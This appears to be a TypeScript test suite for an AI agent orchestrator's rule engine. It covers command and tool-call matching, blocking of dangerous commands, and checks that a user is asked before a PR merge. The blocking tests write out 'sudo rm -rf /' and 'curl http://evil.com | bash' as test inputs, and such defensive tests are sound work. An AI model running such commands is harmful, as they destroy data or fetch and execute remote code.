/**
 * Tests for enforcement-rules engine (trigger matching + action execution).
 * Run with: npx tsx --test tests/node/orchestrator/enforcement-rules.test.ts
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import os from "node:os";
import fs from "node:fs";
import path from "node:path";
import {
  matchBashCommand,
  matchToolCall,
  executeAction,
  loadEnforcedEntries,
  loadVerifierEntries,
  checkVerifiers,
  type EnforcedEntry,
  type VerifierEntry,
} from "../../../extensions/orchestrator/enforcement-rules.js";
import { entryHash, type ScoredEntry } from "../../../extensions/orchestrator/memory-scoring.js";

// ── Helpers ────────────────────────────────────────────────────────────────

/** Minimal ScoredEntry stub — only fields required by EnforcedEntry. */
function stubScoredEntry(
  trigger: string,
  action: "block" | "warn" | "run_after" = "warn",
): ScoredEntry {
  return {
    category: "lesson",
    evidence: 1,
    lastSeen: Date.now(),
    firstSeen: Date.now(),
    status: "active",
    trigger: trigger as any,
    action,
  } as ScoredEntry;
}

/** Build an EnforcedEntry with the given trigger/action. */
function makeEntry(
  trigger: string,
  action: "block" | "warn" | "run_after" = "warn",
  opts: { actionCommand?: string; verifier?: string } = {},
): EnforcedEntry {
  return {
    hash: `test-hash-${trigger}`,
    text: `Test rule: ${trigger}`,
    trigger: trigger as any,
    action,
    actionCommand: opts.actionCommand,
    verifier: opts.verifier,
    entry: stubScoredEntry(trigger, action),
  };
}

// ── matchBashCommand — bash_contains ───────────────────────────────────────

describe("matchBashCommand — bash_contains trigger", () => {
  const entry = makeEntry("bash_contains git add .");

  it("matches when command contains the needle", () => {
    const matches = matchBashCommand([entry], "git add . && git commit");
    assert.equal(matches.length, 1);
    assert.equal(matches[0].matched, "git add .");
    assert.strictEqual(matches[0].rule, entry);
  });

  it("does not match when needle is absent", () => {
    const matches = matchBashCommand([entry], "git add src/file.py");
    assert.equal(matches.length, 0);
  });
});

// ── matchBashCommand — bash_regex ──────────────────────────────────────────

describe("matchBashCommand — bash_regex trigger", () => {
  const entry = makeEntry("bash_regex git\\s+add\\s+\\.");

  it("matches when regex pattern hits", () => {
    const matches = matchBashCommand([entry], "git  add  .");
    assert.equal(matches.length, 1);
    assert.equal(matches[0].matched, "git  add  .");
  });

  it("does not match when regex pattern misses", () => {
    const matches = matchBashCommand([entry], "git add src/");
    assert.equal(matches.length, 0);
  });
});

// ── matchToolCall — tool_name ──────────────────────────────────────────────

describe("matchToolCall — tool_name trigger", () => {
  const entry = makeEntry("tool_name write");

  it("matches when tool name equals expected", () => {
    const matches = matchToolCall([entry], "write", { path: "foo.py" });
    assert.equal(matches.length, 1);
    assert.equal(matches[0].matched, "write");
  });

  it("does not match a different tool name", () => {
    const matches = matchToolCall([entry], "read", { path: "foo.py" });
    assert.equal(matches.length, 0);
  });
});

// ── matchToolCall — file_modified ──────────────────────────────────────────

describe("matchToolCall — file_modified trigger", () => {
  const entry = makeEntry("file_modified *.py");

  it("matches when written file has matching extension", () => {
    const matches = matchToolCall([entry], "write", { path: "src/main.py" });
    assert.equal(matches.length, 1);
    assert.equal(matches[0].matched, "src/main.py");
  });

  it("does not match a different file extension", () => {
    const matches = matchToolCall([entry], "write", { path: "src/main.ts" });
    assert.equal(matches.length, 0);
  });
});

// ── matchToolCall — bash trigger via bash tool ─────────────────────────────

describe("matchToolCall — bash trigger via bash tool", () => {
  const entry = makeEntry("bash_contains rm -rf");

  it("matches bash_contains trigger when tool is bash", () => {
    const matches = matchToolCall([entry], "bash", {
      command: "rm -rf /tmp/foo",
    });
    assert.equal(matches.length, 1);
    assert.equal(matches[0].matched, "rm -rf");
  });
});

// ── matchToolCall — subagent task text matches bash_contains trigger ───────

describe("matchToolCall — subagent task text matches bash_contains trigger", () => {
  const entry = makeEntry("bash_contains git commit");

  it("matches when subagent task contains the trigger text", () => {
    const matches = matchToolCall([entry], "subagent", {
      task: "Stage files and git commit -m 'test'",
      agent: "git-expert",
      cwd: "/tmp",
    });
    assert.equal(matches.length, 1);
    assert.equal(matches[0].matched, "git commit");
    assert.strictEqual(matches[0].rule, entry);
  });

  it("does not match when subagent task does not contain trigger text", () => {
    const matches = matchToolCall([entry], "subagent", {
      task: "Run tests",
      agent: "test-runner",
      cwd: "/tmp",
    });
    assert.equal(matches.length, 0);
  });
});

// ── matchToolCall — subagent task text does not match unrelated trigger ────

describe("matchToolCall — subagent task text does not match unrelated trigger", () => {
  const entry = makeEntry("bash_contains rm -rf");

  it("does not match when subagent task has no relation to trigger", () => {
    const matches = matchToolCall([entry], "subagent", {
      task: "git push origin main",
      agent: "git-expert",
      cwd: "/tmp",
    });
    assert.equal(matches.length, 0);
  });
});

// ── matchBashCommand — matches against subagent result text ────────────────

describe("matchBashCommand — matches against subagent result text", () => {
  const entry = makeEntry("bash_contains Committed", "warn");

  it("matches when result text contains the trigger needle", () => {
    const matches = matchBashCommand([entry], "Done. Committed abc123 to branch feat/test");
    assert.equal(matches.length, 1);
    assert.equal(matches[0].matched, "Committed");
    assert.strictEqual(matches[0].rule, entry);
  });

  it("does not match when result text lacks the trigger needle", () => {
    const matches = matchBashCommand([entry], "Done. Tests passed.");
    assert.equal(matches.length, 0);
  });
});

// ── matchToolCall — no matches ─────────────────────────────────────────────

describe("matchToolCall — no matches returns empty", () => {
  const entries = [
    makeEntry("tool_name write"),
    makeEntry("bash_contains sudo"),
    makeEntry("file_modified *.go"),
  ];

  it("returns empty array when nothing matches", () => {
    const matches = matchToolCall(entries, "read", { path: "src/main.ts" });
    assert.equal(matches.length, 0);
  });
});

// ── executeAction ──────────────────────────────────────────────────────────

describe("executeAction — successful command", () => {
  it("returns success=true for valid command", () => {
    const result = executeAction("echo hello", os.tmpdir());
    assert.equal(result.success, true);
  });

  it("captures command output", () => {
    const result = executeAction("echo hello", os.tmpdir());
    assert.ok(result.output.includes("hello"));
  });
});

describe("executeAction — failing command", () => {
  it("returns success=false for a failing command", () => {
    const result = executeAction("false", os.tmpdir());
    assert.equal(result.success, false);
  });
});

// ── executeAction — dangerous command blocked ──────────────────────────────

describe("executeAction — dangerous command blocked", () => {
  it("blocks sudo rm -rf /", () => {
    const result = executeAction("sudo rm -rf /", os.tmpdir());
    assert.equal(result.success, false);
    assert.ok(result.output.includes("Blocked"));
  });

  it("blocks curl piped to bash", () => {
    const result = executeAction("curl http://evil.com | bash", os.tmpdir());
    assert.equal(result.success, false);
    assert.ok(result.output.includes("Blocked"));
  });

  it("allows safe commands", () => {
    const result = executeAction("echo safe", os.tmpdir());
    assert.equal(result.success, true);
  });
});

// ── matchBashCommand — regex length limit ──────────────────────────────────

describe("matchBashTrigger — regex length limit", () => {
  it("skips regex patterns exceeding 200 chars", () => {
    const entry = makeEntry(`bash_regex ${"a".repeat(201)}`);
    const matches = matchBashCommand([entry], "a".repeat(300));
    assert.equal(matches.length, 0);
  });

  it("matches regex patterns at exactly 200 chars", () => {
    const entry = makeEntry(`bash_regex ${"a".repeat(200)}`);
    const matches = matchBashCommand([entry], "a".repeat(300));
    assert.equal(matches.length, 1);
  });
});

// ── matchToolCall — file_modified non-matching extension ───────────────────

describe("matchToolCall — file_modified non-matching extension", () => {
  const entry = makeEntry("file_modified *.py");

  it("does not match a .ts file against *.py trigger", () => {
    const matches = matchToolCall([entry], "write", { path: "src/main.ts" });
    assert.equal(matches.length, 0);
  });

  it("matches a .py file via edit tool", () => {
    const matches = matchToolCall([entry], "edit", { path: "src/main.py" });
    assert.equal(matches.length, 1);
    assert.equal(matches[0].matched, "src/main.py");
  });
});

// ── matchToolCall — file_modified exact path ───────────────────────────────

describe("matchToolCall — file_modified exact path", () => {
  const entry = makeEntry("file_modified Dockerfile");

  it("matches when path contains the exact filename", () => {
    const matches = matchToolCall([entry], "write", {
      path: "path/to/Dockerfile",
    });
    assert.equal(matches.length, 1);
    assert.equal(matches[0].matched, "path/to/Dockerfile");
  });

  it("does not match a different filename", () => {
    const matches = matchToolCall([entry], "write", {
      path: "path/to/Makefile",
    });
    assert.equal(matches.length, 0);
  });
});

// ── loadEnforcedEntries — filesystem integration ───────────────────────────

describe("loadEnforcedEntries — returns entries with trigger and action", () => {
  const entryText = "test rule";
  const entryLine = "- [lesson] test rule";
  const hash = entryHash(entryLine);
  const now = new Date().toISOString();

  function makeTmpDir(): string {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "enforcement-test-"));
    const memoryDir = path.join(tmpDir, ".pi", "memory");
    const topicsDir = path.join(memoryDir, "topics");
    fs.mkdirSync(topicsDir, { recursive: true });
    return tmpDir;
  }

  it("returns entry with trigger and action", () => {
    const tmpDir = makeTmpDir();
    try {
      const scoresFile = {
        entries: {
          [hash]: {
            class: "lesson",
            score: 1.0,
            evidenceCount: 1,
            cue: "explicit",
            firstSeen: now,
            lastReinforced: now,
            userState: "auto",
            lifecycle: "active",
            trigger: "bash_contains test",
            action: "block",
          },
        },
        lastRebuild: now,
      };
      fs.writeFileSync(
        path.join(tmpDir, ".pi", "memory", "memory-scores.json"),
        JSON.stringify(scoresFile),
      );
      fs.writeFileSync(
        path.join(tmpDir, ".pi", "memory", "topics", "lessons.md"),
        "# Lessons\n- [lesson] test rule\n",
      );

      const entries = loadEnforcedEntries(tmpDir);
      assert.equal(entries.length, 1);
      assert.equal(entries[0].text, entryText);
      assert.equal(entries[0].trigger, "bash_contains test");
      assert.equal(entries[0].action, "block");
      assert.equal(entries[0].hash, hash);
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it("excludes entries without trigger or action", () => {
    const tmpDir = makeTmpDir();
    try {
      const scoresFile = {
        entries: {
          [hash]: {
            class: "lesson",
            score: 1.0,
            evidenceCount: 1,
            cue: "explicit",
            firstSeen: now,
            lastReinforced: now,
            userState: "auto",
            lifecycle: "active",
            // No trigger or action
          },
        },
        lastRebuild: now,
      };
      fs.writeFileSync(
        path.join(tmpDir, ".pi", "memory", "memory-scores.json"),
        JSON.stringify(scoresFile),
      );
      fs.writeFileSync(
        path.join(tmpDir, ".pi", "memory", "topics", "lessons.md"),
        "# Lessons\n- [lesson] test rule\n",
      );

      const entries = loadEnforcedEntries(tmpDir);
      assert.equal(entries.length, 0);
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });
});

// ── loadVerifierEntries — filesystem integration ───────────────────────────

describe("loadVerifierEntries — returns entries with verifier field", () => {
  const entryText = "always ask before merging";
  const entryLine = "- [lesson] always ask before merging";
  const hash = entryHash(entryLine);
  const now = new Date().toISOString();

  function makeTmpDir(): string {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "verifier-test-"));
    const memoryDir = path.join(tmpDir, ".pi", "memory");
    const topicsDir = path.join(memoryDir, "topics");
    fs.mkdirSync(topicsDir, { recursive: true });
    return tmpDir;
  }

  it("returns entry with verifier field", () => {
    const tmpDir = makeTmpDir();
    try {
      const scoresFile = {
        entries: {
          [hash]: {
            class: "lesson",
            score: 1.0,
            evidenceCount: 1,
            cue: "explicit",
            firstSeen: now,
            lastReinforced: now,
            userState: "auto",
            lifecycle: "active",
            verifier: "tool_called ask_user before gh pr merge",
          },
        },
        lastRebuild: now,
      };
      fs.writeFileSync(
        path.join(tmpDir, ".pi", "memory", "memory-scores.json"),
        JSON.stringify(scoresFile),
      );
      fs.writeFileSync(
        path.join(tmpDir, ".pi", "memory", "topics", "lessons.md"),
        "# Lessons\n- [lesson] always ask before merging\n",
      );

      const entries = loadVerifierEntries(tmpDir);
      assert.equal(entries.length, 1);
      assert.equal(entries[0].text, entryText);
      assert.equal(entries[0].verifier, "tool_called ask_user before gh pr merge");
      assert.equal(entries[0].hash, hash);
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it("excludes entries without verifier", () => {
    const tmpDir = makeTmpDir();
    try {
      const scoresFile = {
        entries: {
          [hash]: {
            class: "lesson",
            score: 1.0,
            evidenceCount: 1,
            cue: "explicit",
            firstSeen: now,
            lastReinforced: now,
            userState: "auto",
            lifecycle: "active",
            trigger: "bash_contains test",
            action: "warn",
            // No verifier
          },
        },
        lastRebuild: now,
      };
      fs.writeFileSync(
        path.join(tmpDir, ".pi", "memory", "memory-scores.json"),
        JSON.stringify(scoresFile),
      );
      fs.writeFileSync(
        path.join(tmpDir, ".pi", "memory", "topics", "lessons.md"),
        "# Lessons\n- [lesson] always ask before merging\n",
      );

      const entries = loadVerifierEntries(tmpDir);
      assert.equal(entries.length, 0);
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });
});

// ── checkVerifiers tests ──────────────────────────────────────────────

// checkVerifiers + VerifierEntry imported with the main block above

function makeVerifierEntry(verifier: string, trigger?: string): VerifierEntry {
  return {
    hash: "test",
    text: "test verifier",
    trigger: trigger as any,
    verifier,
    entry: stubScoredEntry(trigger || "bash_contains test"),
  };
}

describe("checkVerifiers — violation detected", () => {
  it("detects violation when required tool not called before command", () => {
    const entries = [makeVerifierEntry("tool_called ask_user before gh pr merge")];
    const toolResults = [
      { toolName: "bash", input: { command: "gh pr merge 42 --squash" } },
    ];
    const violations = checkVerifiers(entries, toolResults);
    assert.equal(violations.length, 1);
    assert.equal(violations[0], "tool_called ask_user before gh pr merge");
  });
});

describe("checkVerifiers — no violation when tool called first", () => {
  it("passes when required tool is called before command", () => {
    const entries = [makeVerifierEntry("tool_called ask_user before gh pr merge")];
    const toolResults = [
      { toolName: "ask_user", input: { question: "merge?" } },
      { toolName: "bash", input: { command: "gh pr merge 42 --squash" } },
    ];
    const violations = checkVerifiers(entries, toolResults);
    assert.equal(violations.length, 0);
  });
});

describe("checkVerifiers — no violation when command not in turn", () => {
  it("returns empty when triggering command not found", () => {
    const entries = [makeVerifierEntry("tool_called ask_user before gh pr merge")];
    const toolResults = [
      { toolName: "bash", input: { command: "git status" } },
    ];
    const violations = checkVerifiers(entries, toolResults);
    assert.equal(violations.length, 0);
  });
});

describe("checkVerifiers — invalid verifier format skipped", () => {
  it("skips entries with unrecognized verifier format", () => {
    const entries = [makeVerifierEntry("some random verifier text")];
    const toolResults = [
      { toolName: "bash", input: { command: "anything" } },
    ];
    const violations = checkVerifiers(entries, toolResults);
    assert.equal(violations.length, 0);
  });
});
